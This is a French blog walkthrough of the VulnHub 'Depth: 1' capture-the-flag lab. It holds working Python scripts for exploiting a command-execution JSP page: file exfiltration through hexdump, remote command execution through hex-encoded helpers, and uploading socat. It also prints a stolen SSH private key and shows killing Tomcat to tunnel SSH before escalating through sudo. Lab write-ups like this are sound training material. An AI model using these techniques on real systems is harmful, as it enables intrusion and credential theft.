# Solution du CTF Depth: 1 de VulnHub

[Tu dois avoir le cul qui brille mais c'est pas ça qu'on appelle la classe](https://www.youtube.com/watch?v=7CYOU1Ey44g)
------------------------------------------------------------------------------------------------------------------------

Récemment je me suis penché sur deux nouveaux CTF en provenance directe de VulnHub : [Depth](https://www.vulnhub.com/entry/depth-1,213/) et [Homeless](https://www.vulnhub.com/entry/homeless-1,215/).  

Les deux sont présentés comme ayant un niveau difficile ou intermédiaire. Pour ce qui est du second je me demande simplement s'il n'y a pas une erreur dans le CTF mais c'est une autre histoire.  

C'est donc bien du *Depth* qu'il va s'agir ici. Et comme il se base sur un cas réel ça devrait être intéressant (je dis intéressant parce que j'aime pas les mots anglais comme fun, ça fait un peu destroy).  

[George est un fasciste de merde](https://www.youtube.com/watch?v=QR983QhqH6k)
------------------------------------------------------------------------------

Un scan sur notre cible ne nous apporte pas grand chose : un port 8080 ouvert et tous les autres sont filtrés.  

Le module *Nikto* présent dans *Wapiti* permet de remonter quelques URLs intéressantes :  

```plain

[*] Launching module nikto
---
Appears to be a default Apache Tomcat install.
http://192.168.0.18:8080/
---
---
Default Tomcat Manager interface found
http://192.168.0.18:8080/manager/html
---
---
This might be interesting...
http://192.168.0.18:8080/test.jsp
Références
  http://osvdb.org/show/osvdb/3092
---
```

La page d'index correspond à la page par défaut de *Tomcat* mais le script *test.jsp* semble permettre l'exécution de commande.  

![Depth command execution](https://raw.githubusercontent.com/devl00p/blog/master/images/depth_rce.png)

Cela dis l'exploitation est rendu compliquée par le fait que l'output de la commande exécutée est découpé en colonnes et que seules certaines colonnes sont affichées.  

![Depth command execution, output splitted](https://raw.githubusercontent.com/devl00p/blog/master/images/depth_echo.png)

Malgré cela en fouillant dans les pages de manuel des commandes système on peut trouver différentes astuces pour remonter d'autres infos.  

Par exemple la commande *ls -ois* permet un affichage permettant d'obtenir les permissions.  

*ls -l /proc/sys/net/ipv4/conf/* permet de connaître le nom de l'interface réseau.  

On encore *ip -d link* permet de récupérer l'adresse MAC de la machine virtuelle et donc [de calculer son adresse IPv6 link-local](http://www.sput.nl/internet/ipv6/ll-mac.html).  

Mais la machine s'avère être bien filtrée en entrée comme en sortie. Impossible d'y accéder en IPv6 ou de trouver le moindre port pour s'échapper (on peut utiliser netcat qui est présent et ses options -z et -w 1 pour tenter de trouver un port de sortie autorisé).  

Comment exfiltrer des données ? Dans un premier temps je me suis tourné vers l'exfiltration des fichiers.  

Avec *hexdump -v -x* on peut afficher un fichier sous cette forme (ici avec le début de */etc/services*) :  

```plain
0000000    2023    654e    7774    726f    206b    6573    7672    6369
0000010    7365    202c    6e49    6574    6e72    7465    7320    7974
0000020    656c    230a    230a    4e20    746f    2065    6874    7461
0000030    6920    2074    7369    7020    6572    6573    746e    796c
0000040    7420    6568    7020    6c6f    6369    2079    666f    4920
0000050    4e41    2041    6f74    6120    7373    6769    206e    2061
0000060    6973    676e    656c    7720    6c65    2d6c    6e6b    776f
0000070    0a6e    2023    6f70    7472    6e20    6d75    6562    2072
0000080    6f66    2072    6f62    6874    5420    5043    6120    646e
0000090    5520    5044    203b    6568    636e    2c65    6f20    6666
```

La première colonne représente l'offset des données dans le fichier. Les autres colonnes sont deux octets sous forme hexadécimale.  

Comme on l'a vu précédemment, seules certaines colonnes sont affichées par le script, on aurait donc alors quelque chose comme cela :  

```plain
X 1  [2]  [3]  [4]  5  6  7  [8]
X 9  [10] [11] [12] 13 14 15 [16]
X 17 [18] [19] [20] 21 22 23 [24]
X 25 [26] [27] [28] 29 30 31 [32]
```

Avec entre crochets les octets récupérables.  

Moyennant un autre hexdump avec un décalage (option -s) on peut compléter :  

```plain
X 4  [5]  [6]  [7]  8  9  10 [11]
X 12 [13] [14] [15] 16 17 18 [19]
X 20 [21] [22] [23] 24 25 26 [27]
```

On s’aperçoit tout de même qu'il faut un appel à hexdump de plus pour obtenir une colonne (les index 9, 17, 25, etc).  

J'ai écrit un script baptisé *dump\_file.py* permettant de reconstruire un fichier texte via les trois appels à hexdump appelés depuis *test.jsp* :  

```python
import sys
from urllib.parse import quote
from binascii import unhexlify
from subprocess import check_output, getoutput

import requests
from bs4 import BeautifulSoup

URL = "http://192.168.1.10:8080/test.jsp?path={}"
filename = sys.argv[1]

def exec(cmd):
    url = URL.format(quote(cmd))
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "lxml")
    infos = []
    for i, row in enumerate(soup.select_one("table:nth-of-type(2)").find_all("tr")):
        if i == 0:
            continue
        columns = []
        for column in row.find_all("td"):
            columns.append(column.text.strip())

        infos.append(columns)
    return infos

def get_size(filename):
    return int(exec("ls -l {}".format(filename))[0][2])

def reconstruct(dest, hexdump1, hexdump2, hexdump3):
    dest[0] = ord('?')
    dest[1] = ord('?')
    for i, row in enumerate(hexdump1):
        for j, column in enumerate(row):
            if j in (0, 1, 2):
                index = i*16 + j*2 + 2
                dest[index] = int(column[2:], 16)
                dest[index+1] = int(column[:2], 16)
            else:
                index = i*16 + 14
                dest[index] = int(column[2:], 16)
                dest[index+1] = int(column[:2], 16)

    for i, row in enumerate(hexdump2):
        for j, column in enumerate(row):
            if j in (0, 1, 2):
                index = i*16 + j*2 + 8
                dest[index] = int(column[2:], 16)
                dest[index+1] = int(column[:2], 16)
            else:
                index = i*16 + 20
                dest[index] = int(column[2:], 16)
                dest[index+1] = int(column[:2], 16)

    for i, row in enumerate(hexdump3):
        for j, column in enumerate(row):
            if j == 0:
                index = i*16 + 16
                dest[index] = int(column[2:], 16)
                dest[index+1] = int(column[:2], 16)

def dump(filename):
    try:
        size = get_size(filename)
    except IndexError:
        print("Get get size of file {}".format(filename))
    else:
        data = bytearray(size + 10)
        reconstruct(
            data,
            exec("hexdump -v -x {}".format(filename)),
            exec("hexdump -v -x -s 6 {}".format(filename)),
            exec("hexdump -v -x -s 14 {}".format(filename))
        )
        print(data.strip(b'\0')[2:].decode())

def test_reconstruct():
    output1 = check_output(["hexdump", "-v", "-x", "/etc/services"]).decode()
    output2 = check_output(["hexdump", "-v", "-x", "-s", "6", "/etc/services"]).decode()
    output3 = check_output(["hexdump", "-v", "-x", "-s", "14", "/etc/services"]).decode()

    hexdump1 = []
    hexdump2 = []
    hexdump3 = []

    for line in output1.splitlines():
        if line:
            row = []
            for i, hex_string in enumerate(line.split()):
                if i in (2, 3, 4, 8):
                    row.append(hex_string)
            hexdump1.append(row)

    for line in output2.splitlines():
        if line:
            row = []
            for i, hex_string in enumerate(line.split()):
                if i in (2, 3, 4, 8):
                    row.append(hex_string)
            hexdump2.append(row)

    for line in output3.splitlines():
        if line:
            row = []
            for i, hex_string in enumerate(line.split()):
                if i in (2, 3, 4, 8):
                    row.append(hex_string)
            hexdump3.append(row)

    data = bytearray(19605 + 10)
    reconstruct(data, hexdump1, hexdump2, hexdump3)
    data = data.strip(b"\0")[2:]

    with open("/etc/services") as fd:
        assert fd.read()[2:] == data.decode()

dump(filename)
```

Il y a une fonction de test qui m'a permis de vérifier la bonne exécution en local.  

On aurait pu penser alors que le fichier */etc/tomcat8/tomcat-users.xml* contiennent des identifiants pour l'accès *manager*... mais ce n'est pas le cas.  

A ce stade je note la présence de trois users sur le système :  

```plain
pollinate:x:111:1::/var/cache/pollinate:/bin/false
tomcat8:x:112:115::/usr/share/tomcat8:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bash
```

Comme on s'y attend on a les privilèges *tomcat8* (il suffit de faire un touch suivi d'un ls pour s'en rendre compte).  

J'ai continué à fouiller mais le plus intéressant que j'ai trouvé c'est une paire clé publique/privée SSH dans */usr/share/tomcat8/.ssh* (via un *find / -user tomcat8 -ls* des familles)  

[Il parait que t'as des propos intolérables, où il n'y a pas de tolérance](https://www.youtube.com/watch?v=Op9eonnohNA)
-----------------------------------------------------------------------------------------------------------------------

Bon c'est pas mal mais sans exécution de commande plus poussée on ne va pas bien loin.  

En dehors du problème de colonnes mentionné plus haut, le script n'est pas vraiment bash-aware et semble plus exécuter les commandes via *execve* que par un *bash -c*. En gros on oublie les redirections, les pipe, les backticks, les points virgules et autres joyeusetés...  

Idem pour les quotes, double-quotes... bref c'est intolérable !  

Ce n'est pas la première fois que je croise une situation comme ça mais là il était tant de faire quelque chose ! En mode Python s'il vous plait !  

J'ai donc d'abord écrit le script *write\_to\_file.py* qui permet d'utiliser les fonctions de base de Python pour écrire un fichier sur le serveur :  

```python
import sys

if len(sys.argv) < 3:
    print("Usage: {} local_file server_file"()

def to_chr(data):
    return "+".join(["chr({})".format(ord(c)) for c in data])

text = open(sys.argv[1]).read()
dest = sys.argv[2]

print("open({},chr(119)).write({})".format(to_chr(dest), to_chr(text)))
```

et dans un deuxième temps un script *pyexec.py* qui prend en argument une chaîne hexa, la décode et exécute la commande bash obtenue en prenant soin de sortir chaque ligne d'output sur la dernière colonne :  

```python
from subprocess import getoutput
from binascii import unhexlify
import sys

cmd = unhexlify(sys.argv[1]).decode()
x = getoutput(cmd).splitlines()
for l in x:
    print("a b c d e f g h "+l)
```

Si je peux uploader *pyexec.py* sur le serveur je le converti avec *write\_to\_file.py* :  

```plain
python write_to_file.py pyexec.py /tmp/pyexec.py
```

Ce qui donne un output de ce style :  

```python
open(chr(47)+chr(116)+chr(109)+...+chr(121),chr(119)).write(chr(102)+chr(114)+...+chr(10))
```

Il suffit d'appeler *python3 -c* suivi de la chaîne obtenue dans le script JSP et voilà !  

Maintenant je peux passer des commandes avec autant de redirections, pipe et compagnie que je le souhaite, il suffit de les passer hex-encodés à pyexec :  

```plain
python3 /tmp/pyexec.py 6c73202d6c
```

[C’est ça, la puissance intellectuelle. Bac + 2, les enfants.](https://www.youtube.com/watch?v=zNjmnd9rYjI)
-----------------------------------------------------------------------------------------------------------

Le dernier script pour clôturer tout ça c'est comme souvent un [REPL](https://en.wikipedia.org/wiki/Read%E2%80%93eval%E2%80%93print_loop) qui permet d'avoir un semblant d’interactivité avec le serveur :  

```python
import sys
from urllib.parse import quote
from binascii import hexlify

import requests
from bs4 import BeautifulSoup

URL = "http://192.168.1.10:8080/test.jsp?path=python3+/tmp/pyexec.py+{}"

while True:
    try:
        cmd = input("$ ").strip()
    except EOFError:
        break

    if cmd.lower() in ("quit", "exit"):
        break

    url = URL.format(hexlify(cmd.encode()).decode())
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "lxml")
    infos = []
    for i, row in enumerate(soup.select_one("table:nth-of-type(2)").find_all("tr")):
        if i == 0:
            continue

        for j, column in enumerate(row.find_all("td")):
            if j == 3:
                print(column.text.strip())
```

Ça permet d'avoir par exemple des infos sur la machine :  

```plain
Linux b2r 4.10.0-35-generic #39-Ubuntu SMP Wed Sep 13 07:46:59 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

ou afficher plus proprement la clé privée SSH :  

```plain
$ cat /usr/share/tomcat8/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEoQIBAAKCAQEAsz1zJbcdpjsIoSvCrXi5Al+5oAk47QF27wZWTKEsSkM4RYp8
+5cnYClmKb800MdSHjcYpQyne9jCM9F7JxO+MDmjLdZsQzPR/y7Sxb9isi9kffeP
4dShapo1f1T+QBktoF+XzI8XIhj3QWHEohA6J6jX5+OfVfZ3FjaZ7iNT/nv45rsF
L47KBM4rhyRavoSTW4vpyJCt9uXKx4zlqSpZ4u9pkgauZihTtit0I8Jvxg9pobbO
EFom1kv359o9MpOv13VEl1MBORrUz4/c/WjDLIP6Yj+XrKLGmKUhvdCk7hc33p9/
yfMD+m/XCw2ygQNywY/J/kdHtykYHCvWUVuC9wIDAQABAoIBAH0lRIZqyhrMUQQn
B7ATACn2KCbjCYoBYccWB59NUR0wvdNgFE+dg/KSNTCkvf2fjWhnU5+5rB6+gymm
83OfR0VomNRiSAjL361qReOn8wMyL9n7xcwJqAJEVWHoN/UNH1xAIj7DEYXPJKPT
3XTCG7ihHM5dkVx1z0QFL4ijxfuB6wSck7p560m1rri8WN9kKymBNC5KDFVHP2P7
+UU6OSjv728TWdMKoOhrT/XYLKusDEpqVOyEXvpYWGUj3l8Zv4tF5f6Fgmb9+Wto
ZJ+xwOYn9yO4VRXpACPV/GYYhq7BZLKReV89z8sJdZMCD19xmHvDsXpuLk3wceGb
T5EcIAECgYEA7CW8uErLewSsuZ9BVxQIbTKPPVxVqUSW+x7NojoOjsX/FIjdTVYt
ytnBW1Njv7ODcR7EicMe4giU/afcFfFeOHbRm+MwloGhgUG2lIXrHOhsZXDgo4aU
czLiEY5AqO+PyBx0xcQkxm7tSzBkB92buAcbzO+2vGcdF+BlP9gnqAECgYEAwk76
Bi655lOhhsWB3Bz9jNt6B22d4i5pJaRdTiWKsDrXd6wVq3U3hxwO1bpFLzp/7mes
ryp7Q2DnEKSEF4z7bH7rsEmjMHk8p9uU9gYEnIsBS/IUK82Jc9pdbfOgm3farUQp
yX5UhHU/VwbfrNhqKGut7lHkfk9fD2IukxeIavcCfxyYdUHbzMgYyNGxdzgUNPEE
LlQ/2h+lLqM6F6yNWzXuw/S4nhO/W8w0kjV845dTJZeNIj+MYTD92QzeRshhcgdk
W/2EhV20VNpSGsnhbZcSjg26nXkv0sogXz/A+hN67u5Mg9du6QUeaZ2xPmu1aiXe
tn8aiAZIdj1t7tTMWAECgYBAkmRON6r5muM72VjtYAj2jV1BKLFmH8w7gSKsvJcZ
N4SxNVPCNeLtGGrppcwmBMfM31EoqPJrksFW64UmGmjXRlpmrCH6EuAQXE1lcNyJ
dTxKE7mWUOiTwoZ36pV99NeL6vIEDuJhXmFdN2CPnR+yLQ6Q+0/2lcPeZd9abGCe
QwKBgQCvMdrd5fX7Oh6gVmwcYCXlleuuJLqM+wQwGca1up9io3hIHX9A26FhGvIp
hpaPRdP4pRyqi1xOY/eSl7UCEtbnv0oB79em+c6tvfaGcJIQL3ENCuD6/nUcPiap
lXn3A5a1JxppcCJNePhYIqBoCGKYWDq9Q3wBcQMIf+fcZjzGsg==
-----END RSA PRIVATE KEY-----
```

Malgré tout ça, rien de bien particulier à ce mettre sous la dents : pas de setuid inhabituels, pas de crontab faillibles, pas de permissions faibles, quand aux fichiers dans */etc/tomcat8/* on ne peut les consulter qu'en lecture !  

Il y a tout de même l'utilisateur *bill* qui sent bon la poudre :  

```plain
$ id bill
uid=1000(bill) gid=1000(bill) groups=1000(bill),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lxd),116(lpadmin),117(sambashare)
```

Et surtout le fait que le process Java du tomcat tourne avec nos droits (tomcat8)...  

Si seulement on pouvait stopper ce process pour récupérer le seul port ouvert (8080) et mettre en place une redirection vers le port 22 (en écoute sur 127.0.0.1)... et bien on avancerait peut être quelque part :D  

D'abord j'ai fait un dernier script Python (demain j'arrête) pour uploader des fichiers :  

```python
from binascii import hexlify
import requests

URL = "http://192.168.1.10:8080/test.jsp?path=python3+/tmp/pyexec.py+{}"

sess = requests.session()
with open("socat_base64") as fd:
    for line in fd:
        line = line.strip()
        cmd = "echo -n {} >> /tmp/socat_base64".format(line)
        sess.get(URL.format(hexlify(cmd.encode()).decode()))
```

L'idée ici est d'abord d'encoder en local (sur la machine d'attaque) le binaire [socat](http://www.dest-unreach.org/socat/) en base64 puis de le recréer côté serveur ligne par ligne. Une fois terminé on décode le base64 côté serveur pour récupérer le socat original. Une astuce que j'avais utilisé pour un précédent CTF.  

Maintenant la problématique est de faire exécuter une série de commande via le serveur Tomcat dont la première commande tue le serveur mais qui doit tout de même exécuter les commandes restantes...  

*crontab* pourrait le faire mais il faut éditer un fichier... et *at* est présent sur le système. C'est donc aussi simple que :  

```plain
echo 'kill -9 1415; sleep 5; /tmp/socat TCP4-LISTEN:8080,fork,reuseaddr TCP4:127.0.0.1:22' | at now + 1 minutes
```

On attend un peu, on se connecte via SSH sur le port 8080... et ça marche !  

[Le train de tes injures roule sur le rail de mon indifférence](https://www.youtube.com/watch?v=eO8PVwwUEsI)
------------------------------------------------------------------------------------------------------------

Sauf que le shell pour *tomcat8* est */bin/false* donc on ne va pas bien loin :D  

A moins que bien sûr la clé SSH ait été réutilisée pour l'utilisateur *bill* :  

```plain
$ ssh -i /tmp/tomcat8_key bill@192.168.1.10 -p 8080
Welcome to Ubuntu 17.04 (GNU/Linux 4.10.0-35-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * What are your preferred Linux desktop apps?  Help us set the default
   desktop apps in Ubuntu 18.04 LTS:
   - https://ubu.one/apps1804

0 packages can be updated.
0 updates are security updates.

Failed to connect to http://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

Last login: Thu Oct 12 14:31:03 2017
bill@b2r:~$ id
uid=1000(bill) gid=1000(bill) groups=1000(bill),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lxd),116(lpadmin),117(sambashare)
bill@b2r:~$ sudo -l
Matching Defaults entries for bill on b2r:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bill may run the following commands on b2r:
    (ALL : ALL) NOPASSWD: ALL
bill@b2r:~$ sudo ls /root
flag
bill@b2r:~$ sudo cat /root/flag
flag{WellThatWasEasy}
```

[Ouiche Loraine](https://www.youtube.com/watch?v=vRgraeaxkAs)
-------------------------------------------------------------

Finalement terminé ce CTF très sympa qui m'aura permis de trouver quelques astuces supplémentaires :)

*Published February 02 2018 at 22:00*